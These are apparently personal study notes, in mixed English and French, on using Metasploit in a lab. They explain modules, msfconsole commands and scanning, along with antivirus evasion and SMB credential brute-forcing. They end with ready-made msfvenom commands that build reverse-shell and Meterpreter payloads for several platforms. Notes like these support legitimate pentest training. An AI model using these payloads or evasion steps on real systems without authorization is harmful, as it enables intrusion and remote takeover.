# Metasploit 

```bash
msfconsole
```

## Tools :
- msfvenom

	
## Modules :
(types :  exploits / vulnerability / payloads)
	
	- Auxiliary -> any supporting module : scanners / fuzzers / crawlers
		liste : $ tree -L 1 auxiliary/ 
	- Encoder -> encode a payload in hope firewalls dont stop it
		  -> detect is based on comparing with known threats DataB
		liste : $ tree -L 1 encoder/
	- Evasion: attempt to evade antivirus software (works on encoded pl)
		$ tree -L 2 evasion/
	- Exploits 
		$ tree -L 1 exploits/
	- NOPs: NOPs (No OPeration) do nothing, literally.
		 often used as a buffer to achieve consistent payload sizes
		$ tree -L 1 nops/
	-Post -> post exploitation (end of a pentest)
		$ tree -L 1 post/
	- PAYLOADS : The codes that will run on the target system. 
		$ tree -L 1 payloads/
		IMPORTANT : 3 CATEGORIES :
			Singles : Self-contained payloads (work alone)
			Stagers : Set up a connection between msf and a 
				the target system / useful when working with
				staged payloads / Small piece that is sent
				first. It will download the rest of the pl
			Stages: Downloaded by the stager. 
				This will allow you to use larger sized
				payloads.
				
		DIFFERENCIATION :
			Single payloads : as above
			Staged payloads : send first a stager and a stages
				it's a larger payload
				
		IDENTIFY SINGLE/INLINE VS STAGED PL (between shell&reverse):
			generic/shell_reverse_tcp	-> _ mean single
			windows/x64/shell/reverse_tcp	-> / mean staged
			
MSFCONSOLE work similarly to a normal shell:
	$ msfconsole 
	(unless set as a global variable, all parameter settings will be
	lost if you change the module)
	
	BASICS COMMAND LINES :
		$ history
		$ help <command>
		$ use Path/to/the_exploit ou nombre apres un search
		$ show options	-> shows selected exploit related options
		$ show payloads ou le type d'un module -> module related to 
		the selected exploit
		$ back -> leave context (like exit)
		$ info -> info related to the exploit
		$ search cve number ou exploit name , any key word...
			- give the path / the rank :
			https://docs.metasploit.com/docs/using-metasploit/
			intermediate/exploit-ranking.html
		$ set NAMEOFPARAM
		$ setg NAMEOFPARAM -> global set
		$ unset NAMEOFPARAM ou marche avec unset all
		$ unsetg NAMEOFPARAM
		$ exploit ou $ run -> lance l'exploit
			- -z flag to run it in bg
		$ check -> regarde si la target est vulnérable avant de $run
		$ backgroung ou CTRL+Z
		$ sessions -> displauys any active sessions
			- -i <session nb> flag to interact with any session
		
	EXPLOIT PARAMS :
		RHOST : target IP (also works with ip/16 and 
			range IP.52-IP.56 to scan a range of ip
			even with a file.txt (1 IP per line)
		RPORT : target port
		Payload : the pl we are using
		LHOST : local host (our ip)
		LPORT : local Port (our port)
		SESSION : Each connection using Metasploit will have a 
			session ID. 
			You will use this with post-exploitation modules
			that will connect to the target system using an
			existing connection.
		
PORT SCANNING :
	$ search portscan
	$ use x
	$ set params
	$ exploit
	PARAMETERS :
		CONCURRENCY: Number of targets to be scanned simultaneously.
		PORTS: Port range to be scanned. (1-10 000 by default)
		RHOSTS:
		THREADS: Number of threads that will be used simultaneously. 
			nmapMore threads will result in faster scans. 

UDP service Identification :
	exploit : scanner/discovery/udp_sweep
	quick way to identify services such as DNS or NetBIOS. 

SMB Scans:
	 expl = smb_enumshares or smb_version
	 
RANDOM USEFUL MODULES :
	- all portscanners modules
	- http_version
	- smb_login -> bruteforce usernames and passwords in smb
	- exploit/multi/handler -> comme netcat mais avec les msfrshells
	
MSF DATABASE :
	To store informations about targets
	
	Launching : (it may take 2min to load)
		$ systemctl start postgresql (in normal shell)
		$ sudo msfdb init (in normal shell)
		Now in msfconsole :
		$ db_status
	
	In DB ($msf console -q): /!\ -q may save me
		$ workspace -> show available workspace
		    -a, --add <name>          Add a workspace.
		    -d, --delete <name>       Delete a workspace.
		    -D, --delete-all          Delete all workspaces.
		    -h, --help                Help banner.
		    -l, --list                List workspaces.
		    -r, --rename <old> <new>  Rename a workspace.
		    -S, --search <name>       Search for a workspace.
		    -v, --list-verbose        List workspaces verbosely.
		$ help (in msf shell) -> displays backend DB command
	
	USEFULL things :
		$ db_nmap = marche exactement comme nmap mais stock les data
		$ hosts ->
			-h -> help
			-R -> add db value tu RHOST parameter
		$ services ->
			-h -> help
			-S serviceName -> search for a specific service
			
			SERVICES INTERSSANTS
    			HTTP: potentially host a  web application with
    				vulnerabilities (SQLi) or  (RCE). 
    			FTP: Could allow anonymous login 
    			SMB: Could be vulnerable to SMB exploits like
    				MS17-010
    			SSH: Could have default or easy to guess credentials
    			RDP: Could be vulnerable to Bluekeep or allow
    				desktop access if weak credentials were
    				used. 


 VULNERABILITY SCANNING :
 	looking for easily identifiable vulns
 	look for scanners modules
 	
EXPLOIT
	$ search xxx
	$ info
	...
	$ exploit
	
	Exploits have a preset payload but we can change it
		$ show payloads
		$ set payloadnumber
		(it may add/del parameters)
		
MSFVENOM : work as msfpayloads and msfencode
	Liste des payloads :
		$ msfvenom -l payloads
	Formats des payloads crées possibles :
		$ msfvenom --list formats
	
	exemple : msfvenom -p php/meterpreter/reverse_tcp
		LHOST=10.10.186.44 -f raw -e php/base64
	
	Flags :
		-p pathtopayload : payload
		-e encode format : encode
		-f : output format
	
	USEFULL PAYLOADS :
	/!\ probleme d'IP avec openvpn : thm n'affiche pas la bonne ??
		ELF :
		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
		WINDOWS :
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
		PHP : (/!\ necessite de modifier le debut avec <?php et la fin avec ?>)
		msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
		ASP :
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
		PYTHON :
		msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
